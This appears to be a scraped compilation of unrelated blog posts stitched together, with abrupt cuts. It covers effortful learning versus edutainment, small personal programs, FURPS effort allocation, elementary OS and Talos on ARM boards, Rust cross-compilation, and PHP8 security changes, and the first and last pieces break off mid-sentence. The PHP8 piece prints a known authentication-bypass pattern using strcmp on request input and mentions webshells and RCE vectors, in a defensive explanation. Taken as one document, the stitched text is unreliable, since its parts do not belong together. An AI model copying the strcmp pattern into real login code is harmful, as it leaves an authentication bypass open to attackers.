<p>A few months ago, doubts began to creep into my mind about the effectiveness of my habits.</p>
<p>While I’d amped up my information consumption, I wasn’t retaining most of it. My memory was behaving like a leaky bucket. Sure, I was spending tens of hours listening to politics on the radio. But when I tried to use any of those points in a conversation, I found that I didn’t actually know enough to make a coherent argument. <strong>I knew the surrounding context, but the moment I needed to get specific my argument would crumble</strong>. Same for many other topics: the more technical they were, the less retention I had.</p>
<p>Where did all that information go?</p>
<p>The problem lied in how I was seeing learning, and therefore how I was approaching it.</p>
<p>Learning is what turns information consumption into long-lasting knowledge. The two things are different: while information is ephemeral, true knowledge is foundational. If knowledge were a person, information would be its picture.</p>
<p>It’s easy to think of learning in <em>accretive</em> terms: if I stack up enough information, it will eventually turn into knowledge. We tend to judge the world in material terms, and if data were tangible, an indefinitely growing memory might be reasonable to assume. The more information I consume, the more information I store, the information data I can later retrieve. The more business newsletters I’ll read, the more I’ll know business.</p>
<p>However, this line of thinking wasn’t really applicable to my case: I was undoubtedly consuming many business newsletters each week, but that wasn’t translating into long-term business knowledge.</p>
<p>I spent the last eight months trying to find an answer to this riddle. It took me deep into the topic of meta-learning: How do humans learn? And how can we learn better in the digital information age?</p>
<h2 id="learning-must-be-effortful">Learning must be effortful</h2>
<p>Unfortunately for us, human memory does not resemble storage, and “passive accumulation” isn’t how learning happens.</p>
<p>The truth is that we retain information only when we put <em>serious effort</em> into the process of learning. The intrinsic effortfulness of learning is not just a byproduct of the core activity, like shortness of breath during running. On the contrary: it’s what <em>actually</em> <em>enables</em> it. The relationship is causal.</p>
<figure>

</figure>

<p>I didn’t find a learning hack to avoid effort because there’s no such thing as easy learning: <strong>learning <em>must</em> be effortful in order for it to happen</strong>.</p>
<p>What surprised me the most is that learning is far more grounded in the physical world than I was comfortable admitting.</p>
<p>The most literal meaning of effort is <em>physical</em> effort (think of weight lifting at the gym). The same holds true with information retention: it works best when the process of assimilating it is <em>physically effortful</em>. Our memory shines when our learning is physical, visceral, and obvious, like the aching in your hands after a morning spent hand-writing.</p>
<p>Since they’re passive, easy, and exclusively digital, after this realization all my podcasts, e-books, audiobooks, newsletters, blog posts, videos, live webinars were suddenly deprived of their “<em>learning status</em>”. Instead, they assumed their proper place in my schedule as pure <em>entertainment</em> activities.</p>
<p>The fact of the matter is that digital products make it uniquely easy to trick yourself into thinking that you’re learning when you are actually being entertained.</p>
<p>What I still didn’t know was why our mind works like this. Is this just the current state of digital learning and teaching, or there’s actually a margin for <em>easy</em> learning to be found somewhere?</p>
<h2 id="the-neurology-of-learning">The neurology of learning</h2>
<p>I’m no expert in medicine, let alone neurology, but I did want to roughly understand what happens when we — as humans —&nbsp;create knowledge. Luckily I didn’t need profound medical expertise to get the gist of the matter.</p>
<p>Our brain is made of a web of interconnected neurons. The links between these neurons are called axons: long, slender projections of nerve fibers that transmit electrical impulses.</p>
<p>Around these axons, there’s an insulating membrane called myelin. It covers many neuronal axons and facilitates the propagation of electrical signals along neuronal circuits. The more myelin around an axon, the stronger and more connected the signal transmission will be.</p>
<figure>
    <img src="https://giansegato.com/img/essays/edutainment-not-learning/image_2.png"> 
</figure>

<p>Myelin is to neural transmissions as oxygen is to fire. It allows rapid information transfer over long distances, and it <a href="https://doi.org/10.1126/science.1261127">greatly increases</a> the speed of propagation of electric signals in our brain.</p>
<p>See it as water flowing through a pipe with dynamic, changing capacity. Pipes with greater capacity can move more water, more quickly than a small pipe or a slow drip. The more myelin supporting a neural connection, the easier it is to use that connection — and thus to use the skill or remember the topic associated with that connection</p>
<p>A key aspect of myelin is that it’s highly dynamic. It’s an integral component of our brain plasticity. So the question becomes: how is myelin generated, and why?</p>
<p>When we come across a new topic, new regions of the brain start activating. The more we use those new regions, the more myelin is synthesized, the easier that topic (or activity) gets.</p>
<p>We all know the old saying <em>practice makes perfect</em>. The more we use a certain region of our brain, the more our brain “prioritizes” and “hones” it. That is what leads to myelin: activity induces myelination, which leads to increased strength of connectivity and efficiency along those very neurons. It’s a self-reinforcing process.</p>
<p>In other words, it compounds.</p>
<figure>
    <img src="https://giansegato.com/img/essays/edutainment-not-learning/image_3.png"> 
</figure>

<p>See now why it’s so hard to learn? To learn anything we must make active use of unexplored regions of our brain <em>before</em> they’re ready. It’s, quite literally, getting out of the comfort zone. The more we use them, the more they get better. <strong>Learning is <em>structurally</em> hard.</strong></p>
<p>The truly mesmerizing thing about myelination is that it is correlated with active use of <em><a href="https://doi.org/10.1038/nn.4351">motor neurons</a></em>. It looks like human cognition is fundamentally grounded in sensory-motor processes: we retain information better when we associate some <em>physical activity</em> to it. <strong>The general intuition is that movement provides additional cues we can use to retrieve knowledge.</strong></p>
<p>We can see this effect happening when we take notes. A larger corpus of research is suggesting that taking notes physically — that is, by hand-writing them — is <a href="https://doi.org/10.3389/fpsyg.2020.01810">far more effective</a> than using a laptop. Keyboarding does not provide tactile feedback to the brain that the contact between pencil and paper does: this contact, this raw feedback, is the key to creating the neurocircuitry in the hand-brain complex, that <a href="https://doi.org/10.3389/fpsyg.2020.01810">evidence shows</a> supports memory and retention.</p>
<p>All of this means <strong>we need to radically reassess digital learning</strong>. We haven’t evolved to store information by passively watching Masterclass videos: that’s just not how our minds work.</p>
<p>However, the other side of this coin is that we’re living in times of unprecedented information surplus. This is an opportunity that we should learn to seize.</p>
<h2 id="creative-learning-in-a-digital-world">Creative learning in a digital world</h2>
<p>The best way to describe my information diet before discovering that effort is instrumental to learning would be <em>edutainment</em>.</p>
<p>Edutainment mixes education topics with entertainment methodologies. Even if edutainment optimizes for passive attention instead of effortful engagement (the opposite of learning), it’s not just “mere fun.” Deleting Twitter and unsubscribing from newsletters, as suggested by Deep Work advocates like <a href="https://www.calnewport.com/books/deep-work/">Cal Newport</a>, can actually end up <em>preventing</em> learning.</p>
<p>I see edutainment as <em>preparation for learning</em>: it’s a powerful explorative tool that can provide ideas and motivation to learn. And yet, it’s also not learning itself, in the same way as buying running shoes is not running.</p>
<p>Within this framework, “mindless” browsing online can be transformed into <em>scouting for learning opportunities</em>. It’s yet another searching problem where it’s key to balance the exploration of new opportunities with the commitment to the existing ones — a topic I wrote about at length in <a href="https://giansegato.com/essays/the-ebb-and-the-flow-of-product-development/">another essay</a>. It’s about balancing the time spent “scouting” for interesting topics online with the offline effort needed for long-term retention and integration.</p>
<hr>


<hr>
<p>Pragmatically, I solved this trade-off with a powerful tool: a learning inbox.</p>
<p>A learning inbox is a to-do list for stuff I’d like to actually learn. I picked up the idea from Andy Matuschak — legendary ed-tech expert —, who <a href="https://notes.andymatuschak.org/A_reading_inbox_to_capture_possibly-useful_references">used a similar concept</a> as a tool for capturing possibly-useful references. The learning inbox is a system that forces me to be mindful about what content is <em>learning</em>, and what is at the end of the day just <em>entertainment</em>.</p>
<p>Everything interesting I find on my way is sent to my learning inbox and from there gets triaged, be it a paper, an online essay, a blog post, a YouTube video, or a podcast. When an item ends up in there, there are three things that can happen: I either decide to actively engage with it, to file for future interest, or just trash it. Active engagement is exactly what it sounds like: <strong>I need to take effortful action to consume the content in the list</strong>, otherwise I automatically bucket it as entertainment.</p>
<p>In other words, I need to do something with it. To <em>create</em> something. Write a blog post about it, use it in a new project, test it on the field, teach it at a meetup. That’s why I speak at <a href="https://giansegato.com/about/#talks">many conferences</a>: it’s a learning tool.</p>
<p>In <a href="https://gettingthingsdone.com/">GTD fashion</a>, permanence in this list is temporary. It’s a release valve, not a …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Over the summer, I developed a couple of small, sort of silly programs.
One, <a href="https://jakemccrary.com/experiments/photo-fit/">Photo Fit</a>, is a little tool that runs in a web browser and resizes photos to fit as your phone’s background.
The other, <a href="https://default-equipment.herokuapp.com/">Default Equipment</a>, runs on Heroku and automates changing the “bike” of my Strava-tracked e-bike rides to be my <a href="https://onewheel.com/">onewheel</a>.</p>

<p>These weren’t created to solve large problems in the world.
There is no plan to make any money with them.
As of October 2020, Default Equipment doesn’t even work for other people (though it could, send me a message if you’d like to use it and I’ll get around to it).</p>

<p>Each was created to fix a minor annoyance in my life and, because these tools can live on the Internet, they can fix the same minor annoyance in other lives.</p>

<p>With an increasing amount of software in the world, being able to write software is nearly sorcery<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.
As a developer, you can identify a problem in the world and then change the world to remove that problem.
And, depending on the problem, you can remove it for everyone else.</p>

<p>Software developers aren’t alone in being able to identify problems and remove them through creation.
Carpenters can build shelves for their books.
Cooks can prepare food to remove hunger.
You can come up with nearly an infinite number of other examples.</p>

<p>The difference is that a solo developer can solve problems for an unknown number of other folks.
This is enabled by the Internet enabled ease of distribution.
This is very powerful.</p>

<p>Developers can expose their solution to others through a web application.
Desktop or mobile applications can be distributed through various app stores or made available as a download.
Source code can be made available for others to run.
Being able to distribute easily and cheaply is a game changer.</p>

<p>A developer’s change to the world might be a minor improvement.
Photo Fit might never be used by anyone besides me.
But it is still out there, making the world slightly better.
It is available for someone to stumble upon when they are also annoyed by the same problem.</p>

<p>It felt good to write these tiny, useful programs.
If you scope them small enough, there is a definitive ending point<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>.
This lets you feel that finishing-a-project satisfaction quickly.
The small size also allows you experiment with new techniques and tools without committing to a large and ongoing commitment.</p>

<p>I wrote both Photo Fit and Default Equipment in TypeScript.
Before the beginning of summer, I didn’t know TypeScript and had little exposure to Node.js.
Now I have some experience with both and gained that while making small improvements to my life and potentially the lives of others.</p>

<p>If you haven’t developed software to solve a small problem recently, I’d recommend doing it.
Don’t hesitate to remove a problem that feels silly.
Removing those problems can still make your life slightly better and gives you an opportunity to learn.
It feels good to remove an annoyance from your life.
If you can, make that software available to others so their lives are improved as well.
Take advantage of the power of easy distribution to improve the world and not just your tiny slice of it.</p>

<div>
<p>Over the years of building software products from scratch in an agile, and iterative fashion, here’s an interesting thought process for software engineering that I’ve recognized to be working very well —&nbsp;</p>
<p>FURPS is an acronym used by Requirement gatherers to categorize requirements into Functionality, Usability. Reliability, Performance, and Supportability.</p>
<p>What I’ve noticed is, if you take them as part of your software development planning and efforts allocation, IN THAT ORDER in terms of the priority, it helps to optimize for the efficiency of the value delivery as the effect of your software building/product delivery.</p>
<p>Let me explain this idea more concretely-</p>
<p>Let’s say you are building a new product from scratch, then the effort allocation for the Version 0 (which might be a Proof of Concept product) can be thought something like this —</p>
<p><strong>ITERATION 0&nbsp;</strong></p>
<p>Functionality – 60 % or more of your efforts should be put here. Why? because this is V0, and everyone wants to just see whether this works! Nothing is more important than functional software at this point. A common understanding here is that the software is kept as simple as possible at any given point of time while delivering on the functionality.</p>
<p>Usability – 20 % of your efforts should go here. Why? usability is an important factor, but not as critical as functionality, even in case of business to consumer products, and especially in the case of business to business products. Hence, apart from having a “common-sense” usability aspects baked into your product, no special efforts are required here at this point in software development.</p>
<p>Reliability – 10 % of your efforts should go here. Why? as a V0 of the product, the reliability of this software is an inherent effect of its simplicity. When your software isn’t doing too many things, and there aren’t much intra-component communication or complex infrastructure setup, your software is reliable by default. You don’t need to invest too much on reliability at this point.</p>
<p>Performance – 5 %. Why? because premature optimization is the root of all evil! At V0, you are not going to have any particular performance or scalability problems. Even if you have. you probably can’t predict them really well when you are building V0, as you may not be fully aware of the expected behaviour of the user and the system. The best thing here is to wait, roll-out and watch as the performance problems occur. “Common-sense” performance optimization is good enough at this point.</p>
<p>Supportability – 5 %. Why? As a V0, you won’t fully know about how and in what ways supportability might be needed. And at V0, the product builders are best suited to provide the support, can be production hot-fixes, or can be pulling data/reports. Then the product builders would get a good understanding of supportability requirements for the future.</p>
<p>Let’s say you are finished with your V0, and your consumers/stakeholders are happy with the software in the sense that they are confident on “this works”. Now the natural next step is (depending upon the business and consumer need), is to build Version 1 of this software, which would be a more complete solution.</p>
<p>In such a case, the efforts allocation can be done in the following ways —</p>
<p><strong>ITERATION 1</strong></p>
<p>Functionality – 40%. Why? because you are building on top of the simple software that you’ve built for V0. Building functionality with relatively fewer efforts allocation will help you to be focused, keeping it simple, yet delivering what is needed.</p>
<p>Usability – 30%. Why? At this point, you know about what are the most critical pain-points for your users, and you must focus to solve those while keeping it simple.</p>
<p>Reliability – 10% Why? At V1, everyone would expect the software to function reliably. Here you should fix common reliability issues that you’ve noticed in V0 production.</p>
<p>Performance – 10%. Why? at this point, you have already know the performance bottlenecks, and your stakeholders might want to scale it up for the larger audience. So relatively better focus on performance helps here.</p>
<p>Supportability – 10%. Why? because now you have gone through the support process yourself, and you now know what is needed, and you are better suited to build APIs/ tools to better support your software or hand it over to other folks to do it.</p>
<p>With iteration 1, your software is now more stable. Now usually the stakeholders and users expect some new features and better usability with each iteration.</p>
<p>Hence from now onwards, you can do something like this —</p>
<p><strong>ITERATION 2</strong></p>
<p>Functionality – 30 % — Now you’ve built some base systems and components, adding new features would be easy. You can also use this time to reduce tech-debts or refactoring code-smells etc.</p>
<p>Usability – 30 % — This is the time to really invest on usability. You should really go through each flow, design aspects, and start iterating on improving usability.</p>
<p>&nbsp;Reliability – 20% — Primarily to mitigate the impact of additional functionality being built as part of V2 on reliability, You must not break working software at the expense of adding something new at this point.</p>
<p>Performance – 20% — Primarily to mitigate the impact of additional functionality being built as part of v2 and scale.</p>
<p>Supportability – 10% — to add on to the supportability and tooling that you have built on V1, and to support the new functionality being built-in v2.</p>
<p>From iteration 3 onwards, you will find the “equilibrium” levels of these figures, which should guide you further, in the process.</p>
<p>To conclude,&nbsp;<strong><em>while building software, most efforts should be put on building the functionality, followed by usability, then reliability, performance, and usability</em></strong><em>. The concrete figures on how much efforts that are put will vary as the time (and iterations) progress, but “FURPS in that order” would still be a general theme.</em></p>
<p>The figures used in the above example will vary depending upon the type of software you’re building, and are representative of the general idea.</p>
<p>All of this thought process has come from my personal experience building software over the years, and not from a formal course or study on this matter.</p>
<p>What are your thoughts on this? Feel free to share in the comments!</p>

  <section>
    <p>Following our <a href="https://blog.elementary.io/elementary-os-on-pinebook-pro">efforts to bring elementary OS to the ARM-based Pinebook Pro</a>, we’ve added experimental builds for the ARM-based Raspberry Pi 4 series—including the recently-launched Raspberry Pi 400—to our <a rel="nofollow noopener noreferrer" target="_blank" href="https://builds.elementary.io/">Early Access</a> program. Like Pinebook Pro builds, Raspberry Pi support is considered an experiment and is not something we have committed to officially support indefinitely. However, if you’re one of the many folks with a Raspberry Pi 4 sitting around and wanted to see how a full, modern desktop operating system runs, elementary OS is now an option!</p>

<figure>
  <p><img src="https://blog.elementary.io/images/elementary-os-on-raspberry-pi/desktop.jpg" alt="Raspberry Pi 4 running elementary OS"></p>
  <figcaption>My current desktop, powered by a Raspberry Pi 4 running elementary OS</figcaption>
</figure>

<p>Personally, I typically use Raspberry Pi 4 as a network device, e.g. a DNS server and for network-attached storage. However, I’ve been using elementary OS builds on it for the past week, and I’m impressed. While it won’t compete experience-wise with a high end desktop, it is a real option for casual computing, development, and writing. In fact, this blog post was written entirely on my Raspberry Pi 4 running elementary OS. It would even be possible to run the same network services on the hardware from within elementary OS just so you get a nice modern GUI when doing any local management.</p>

<p>Like with <a href="https://blog.elementary.io/elementary-os-on-pinebook-pro">Pinebook Pro</a>, there are some things you should know if you plan to use elementary OS Early Access builds on Raspberry Pi:</p>

<h2 id="kernel">Kernel</h2>

<p>Since Ubuntu has released Raspberry Pi images, we are able to rely on that work to ship a supported and updated kernel. Thanks to all of the folks at Canonical and in the Ubuntu community who have worked to make that happen!</p>

<h2 id="performance">Performance</h2>

<p>elementary OS on Raspberry Pi 4 is not going to match the polished experience of a full modern desktop computer, largely due to our current software stack. GTK3 does not offer GPU-accelerated animations, so animations within apps are less smooth than we would like. Still, for a computer coming in at under $100, it’s impressive and perfectly usable for several tasks.</p>

<p>There are also some things you can do to improve performance. We would definitely recommend using some sort of cooling with your Raspberry Pi, whether that’s a a heatsink and fan (like the recently-announced <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.raspberrypi.org/blog/new-raspberry-pi-4-case-fan/">Raspberry Pi 4 Case Fan</a>), or a passive case like one from <a rel="nofollow noopener noreferrer" target="_blank" href="https://flirc.tv/">Flirc</a>—my favorite for its looks and silence. Since Raspberry Pi 4 tends to throttle due to heat under desktop loads, cooling will help it stay more responsive. We also recommend trying USB3 storage as your boot drive, as it should be faster than a microSD card. Using a 1080p (or lower) resolution also works a fair bit better than trying to push a 1440p or 4K display, but your mileage may vary based on your use case.</p>

<h2 id="supported-raspberry-pi-models">Supported Raspberry Pi Models</h2>

<p>We recommend Raspberry Pi 4 or Raspberry Pi 400 with 4 GB RAM at a minimum—but the more, the better. (We don’t even recommend less than 8 GB for computers with much faster CPUs, graphics, and storage.)</p>

<p>Older models of Raspberry Pi (like the original, Raspberry Pi Zero, Raspberry Pi 2 series, and Raspberry Pi 3 series) are not supported; elementary OS requires the faster processor, additional RAM, and 64-bit architecture of the Raspberry Pi 4 series. For older models, we recommend sticking to Raspberry Pi OS or a “headless” OS like Ubuntu Server.</p>

<h2 id="run-elementary-os-on-raspberry-pi">Run elementary OS on Raspberry Pi</h2>

<p>In its current state, we would not consider elementary OS on Raspberry Pi as polished of an experience as running on well-supported AMD- or Intel-based hardware.</p>

<p>That said, the audience for Raspberry Pi leans toward tinkerers and experimenters; as such, we’ve decided to publish our builds under our <a rel="nofollow noopener noreferrer" target="_blank" href="https://builds.elementary.io/">Early Access builds</a> program. This means dedicated <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/elementary">sponsors</a> of elementary OS who wish to run elementary OS on Raspberry Pi can download it from the same place as Early Access builds of elementary OS. As a note, all of this work has been focused on bringing the <strong>pre-release of elementary OS 6</strong> to Raspberry Pi, so all the usual disclaimers about pre-release builds apply here as well.</p>



<p>Once you have access to Early Access builds, head over to the <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/elementary/os/wiki/Raspberry-Pi">elementary OS wiki</a> to get it installed on your own hardware. If you find and file any issues, please remember to specify the build of the OS you downloaded as well as that you are running on Raspberry Pi—it will help us validate and triage issues much more quickly.</p>

<h2 id="thanks-to-andrew-david-hewitt-and-marius-meisenzahl">Thanks to Andrew, David Hewitt, and Marius Meisenzahl</h2>

<p>Bringing elementary OS to Raspberry Pi was a collaborative effort. <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/andrewc910">Andrew</a>, <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/davidmhewitt">David Hewitt</a>, and <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/meisenzahl">Marius Meisenzahl</a> specifically worked to prototype, improve, and ultimately ship these builds. And of course countless folks across the Raspberry Pi Foundation, Debian, Canonical, Ubuntu, and more have worked for years on making the underlying system work well for us to build on.</p>

		<p>It has been almost two years since Talos was first announced to the world. ARM support was almost immediately a feature request. At the time the project had major features missing that needed to be implemented before we could even <em>think</em> about Talos on ARM. Only after forming a company, hiring a kick ass team, and pouring a tremendous amount of time and love into Talos have we finally been able to achieve this.</p>
<p>The Talos team is proud to announce support for four ARM single board computers (SBCs) in our latest alpha release:</p>
<ul>
<li>Raspberry Pi 4 Model B</li>
<li>Pine64 Rock64</li>
<li>Banana Pi M64</li>
<li>Libre Computer ALL-H3-CC H5 (Tritium)</li>
</ul>
<p>For those not familiar with Talos, it is an ultra minimal OS with an API instead of ssh+shell built for the purpose of running Kubernetes with security as a priority. The image is immutable, the runtime is ephemeral, and the configuration is declarative. For more on what all of this means, see our documentation at <a href="https://www.talos.dev/">https://www.talos.dev/</a>. We think you will love it.</p>
<p>Landing support for SBCs signifies a huge milestone for Talos. You can now run Talos nearly anywhere you can imagine. The same Talos is able to run in the cloud, on-premise, and now at the edge. This means you get a resource efficient, secure, and reliable OS running the same vanilla Kubernetes that you run in production datacenters - wherever you might need it.</p>
<p>We are looking to add support for more boards. Please, let us know what boards you might be interested in by creating an issue in the GitHub <a href="https://github.com/talos-systems/talos">repo</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

<h2 id="why-do-i-care-about-this">Why do I care about this</h2>

<p>Recently I solved <a href="https://github.com/dandavison/delta/issues/396">this</a> delta issue,
where the maintainer asked to switch from Travis CI to GitHub actions.</p>

<p>These are all the pull requests I’ve done if you want to have a look at this journey:
<a href="https://github.com/dandavison/delta/pull/399">#399</a>, <a href="https://github.com/dandavison/delta/pull/400">#400</a>,
<a href="https://github.com/dandavison/delta/pull/409">#409</a>, <a href="https://github.com/dandavison/delta/pull/411">#411</a>,
<a href="https://github.com/dandavison/delta/pull/413">#413</a>, <a href="https://github.com/dandavison/delta/pull/417">#417</a>
and finally <a href="https://github.com/dandavison/delta/pull/418">#418</a>.</p>

<p>And yes..As you can see I like small incremental work and early feedback instead of giant pull requests. 😁</p>

<p>Anyway, the delta project has a lot of compilation targets and the binaries are automatically released in the
GitHub releases <a href="https://github.com/dandavison/delta/releases">page</a> every time the project is tagged. Sweet. 😌</p>

<p><img src="https://www.marcoieni.com/2020/12/rust-makes-cross-compilation-childs-play/delta.png" alt="delta releases" title="Releases"></p>

<p>From an x86_64 architecture (TLDR: common 64 bit Intel or AMD processors) it is really straightforward to
compile for a different operating system with <code>cargo</code> if you are targeting the same architecture.
For example if you want to compile for macOS you just need to run:</p>

<pre><code>rustup target add x86_64-apple-darwin
cargo build --target x86_64-apple-darwin
</code></pre>

<p>The problems start to arise when you want to compile for a different architecture, such as i686 (32 bit) or ARM processors.
In this case, you have to install some dependencies and set some environment variables, which may be painful.
For example, in the old continuous integrations scripts of delta,
<a href="https://github.com/dandavison/delta/blob/15d06cbf7584570ec3b5beaba99cb8898f9ec3dc/etc/ci/before_install.sh">this</a>
was the way dependencies were installed. Ugly, I know. As rust developers we are used to great tools,
so there must be a better way right?</p>

<h2 id="meet-cross">Meet Cross</h2>

<blockquote>
<p>“Zero setup” cross compilation and “cross testing” of Rust crates.</p>
</blockquote>

<p>This is the description of the <a href="https://github.com/rust-embedded/cross">Cross</a> tool.</p>

<p>The TLDR is that it let you compile and test rust projects for architectures other than i686 and x86_64.</p>

<p>Instead of doing <code>cargo build --target &lt;YOUR_TARGET&gt;</code> you simply do <code>cross build --target &lt;YOUR_TARGET&gt;</code>.
Based on the target, in fact, cross will run a docker image that has all the right dependencies already
installed and configured by the rust-embedded team itself. 😉
And that’s it..just run <code>cargo install cross</code> and you are ready to cross-compile for all
<a href="https://github.com/rust-embedded/cross#supported-targets">these</a> targets in rust, no other dependency
is required, except docker of course!</p>

<p>Obviously this was not an exhaustive overview about cross and I encourage you to have a look at the GitHub page
if you are interested.</p>

<h2 id="cross-in-github-actions">Cross in GitHub actions</h2>

<p>Of course, after a whole morning getting mad trying to setup weird ubuntu dependencies for the delta issue,
when I found out about cross I felt very stupid for not knowing it in advance and I tried to integrate it in the
Continuous Deployment delta pipeline.</p>

<p>It turns out that this is like the easiest thing in the world! The <a href="https://github.com/actions-rs/cargo">action-rs/cargo</a> action
I was already using had built-in <a href="https://github.com/actions-rs/cargo#cross-compilation">support</a> for cross.
Now I even felt more stupid, but anyway..you just need to set the <code>use-cross</code> variable to <code>true</code> and you are done!</p>

<p><a href="https://github.com/dandavison/delta/blob/e198c0d841d9fb660e59e0329235a8601b407c69/.github/workflows/cd.yml#L32-L37">This</a>
is the step that builds the whole delta project for all its different targets..easy, right? 😀</p>

<h2 id="cross-in-rust-github-template">Cross in Rust GitHub template</h2>

<p>You may or (probably) may not be aware of <a href="https://rust-github.github.io/">Rust GitHub Template</a>.</p>

<blockquote>
<p>Rust GitHub Template is a template for cargo generate that aims to be a starting point suitable for the vast majority of rust projects that will be hosted on GitHub.</p>
</blockquote>

<p>Beyond all its nice goodies, this template will setup Continuous Deployment for you, therefore whenever
you tag your project, it will be published on <code>crates.io</code> and the binaries will be released in the GitHub Releases page,
just like in delta. 😁</p>

<p>Until today, Rust GitHub template only supported x86_64 windows, linux and mac, but after I found out Cross I couldn’t resist
and I added support for i686 and aarch64 linux architectures, which are both two <a href="https://doc.rust-lang.org/nightly/rustc/platform-support.html">tier 1</a> rust targets.
In practice, this means your “old thinkpad” and “raspberry pi” users will thank you a lot. 😛</p>

<p><img src="https://www.marcoieni.com/2020/12/rust-makes-cross-compilation-childs-play/rust-gh.png" alt="gh template releases" title="Releases"></p>

<p><a href="https://github.com/rust-github/rust-gh-example/blob/01e0aae91f83e1e932f4498a0eddb2905c8fffc3/.github/workflows/cd.yml#L57-L63">This</a>
is an example of the resulting Continuous Deployment step.</p>

<p>And that was it, after I spent a lot of <em>very useful</em> time trying to setup compilation dependencies basically I just wanted to share my love for the <code>cross</code>
tool with the rest of the world in order to avoid this pain to as many people as possible. 😅</p>

<p>Thanks for reading this far! You can find me on <a href="https://twitter.com/MarcoIeni">twitter</a> or <a href="https://www.youtube.com/MarcoIeni">YouTube</a>, bye! 👋</p>

      <p>PHP8 was <a href="https://www.php.net/releases/8.0/en.php">released</a> on the
26<sup>th</sup> of November 2020. It brought a lot of interesting things,
security-wise, but also showcases a couple of (minor) missed opportunities in my
opinion.</p>
<h2 id="type-safety"><a href="#type-safety">Type safety</a></h2>
<p>I'm a big fan on relying on typing to ensure security properties,
like <a href="https://web.dev/trusted-types/">Trusted types</a> in javascript: it
shouldn't compile if it's not secure.</p>
<p>PHP8 won't try to cast string into numbers anymore, thanks to the 
<a href="https://wiki.php.net/rfc/string_to_number_comparison">Saner string to number comparisons RFC</a>,
meaning that collision with hashes starting with <code>0e</code> and the likes are finally
a thing of the past! This is a subset of Snuffleupagus' <a href="https://snuffleupagus.readthedocs.io/features.html#preventing-sloppy-comparisons">sloppy comparison
prevention</a> feature.</p>
<p>The <a href="https://wiki.php.net/rfc/consistent_type_errors">Consistent type errors for internal functions RFC</a>
will prevent things like <code>0 == strcmp($_GET['username'], $password)</code> bypasses,
since <code>strcmp</code> won't return <code>null</code> and spit a warning any longer,
but will throw a proper exception instead. This was also a <a href="https://externals.io/message/106522">nice opportunity</a>
for PHP to add annotations for functions parameters and return types.</p>
<p>The <a href="https://wiki.php.net/rfc/arithmetic_operator_type_checks">Stricter type checks for arithmetic/bitwise operators</a>
and <a href="https://wiki.php.net/rfc/engine_warnings">PHP RFC: Reclassifying engine warnings</a> RFC
are in the same spirit.</p>
<h2 id="jit"><a href="#jit">JIT</a></h2>
<p>PHP8 comes with a <a href="https://wiki.php.net/rfc/jit">JIT</a> based on
<a href="https://luajit.org/dynasm.html">DynASM</a>, bringing an RWX memory space into
PHP's memory space, into a shared allocation, meaning that its offset won't
change between different PHP8+ processes.</p>
<p>Moreover, DynASM isn't designed with processing/compilation/execution of
untrusted code in mind, and doesn't do things like constants blinding and
advanced folding to mitigate against spraying, nor random padding/nop
insertion, nor ensuring that the memory region is never both writeable <em>and</em>
executable to prevent direct code injection. This means that it's now way
easier to gain native code execution when exploiting memory corruptions,
albeit to be fair, most attackers are happy with a php code execution,
and won't push further.</p>
<p>Having a JIT comes with a lot of code complexity and maintenance burden. I'll
be without doubt a <a href="https://bugs.php.net/search.php?cmd=display&amp;order_by=ts1&amp;direction=DESC&amp;limit=30&amp;package_name[]=JIT">great source of
bugs</a>,
for a minor speed improvement on real-life workloads.</p>
<h2 id="cryptography"><a href="#cryptography">Cryptography</a></h2>
<ul>
<li><code>password_hash</code> now automatically generates a salt, accepting a
    user-provided one is deprecated.</li>
<li><code>crypt</code> will now fail instead of silently falling back to
    <a href="https://en.wikipedia.org/wiki/Crypt_(C)#Traditional_DES-based_scheme">DES</a>
    when an unknown salt format was provided. The parameter is also made
    mandatory, hashing without a salt is now unsupported.</li>
<li><a href="https://tools.ietf.org/html/rfc5652">RFC 5652</a> is now exposed via the OpenSSL extension.</li>
</ul>
<h2 id="misc"><a href="#misc">Misc</a></h2>
<ul>
<li>The <a href="https://www.php.net/manual/en/language.operators.errorcontrol.php">error control operator</a>, aka <code>@</code>
    won't silence fatal errors anymore, meaning that poorly written webshells will have more chances
    to leave traces in your logs.</li>
<li><code>libxml_disable_entity_loader</code> is now deprecated, even if it's not (yet) reflected in php's documentation.
    This is acceptable since PHP8 now requires at least libxml 2.9.0,
    which comes with external entity loading disabled by default.</li>
<li>Access to undefined constants will throw an error, instead of being silently
  interpreted as a string, no more <code>SALT</code> being silently converted to <code>"SALT"</code>.</li>
<li><code>create_function</code> was <a href="https://github.com/php/php-src/commit/ee16d99504f0014c3d292809da927fb622293f41">removed</a>, closing its infamous code injection vector.</li>
<li><code>array_key_exists</code> throws when passed an array/object, instead of silently
  doing nonsense.</li>
<li>The <code>e</code> modifier in <code>mb_ereg_replace</code> has been removed.</li>
<li>Metadata associated with a phar will
  <a href="https://wiki.php.net/rfc/phar_stop_autoloading_metadata">no longer be unserialized</a>,
    killing a low-hanging
    <a href="https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">RCE vector</a>.</li>
<li><code>FILTER_SANITIZE_MAGIC_QUOTES</code>, <code>get_magic_quotes_gpc</code> and <code>get_magic_quotes_runtime</code> have been removed,
  people will now have to do proper sanitization instead.</li>
<li>As usual, a couple of memory safety issues were fixed,
    <a href="https://bugs.php.net/bug.php?id=80242">some</a>
    <a href="https://bugs.php.net/bug.php?id=76618">exploitable</a>.</li>
<li><a href="https://github.com/jvoisin/snuffleupagus">Snuffleupagus</a> is currently being
    ported to php8!</li>
</ul>
<h2 id="missed-opportunities"><a href="#missed-opportunities">Missed opportunities</a></h2>
<p><a href="https://wiki.php.net/rfc/engine_warnings#undefined_variable">Undefined
variables</a>, as
opposed to constants, are still not an error, meaning that things like <code>solt</code>
instead of <code>salt</code> might (and will) go unnoticed.</p>
<p>Converting an <code>Array</code> to a string will only yield a <code>Warning</code> instead of an
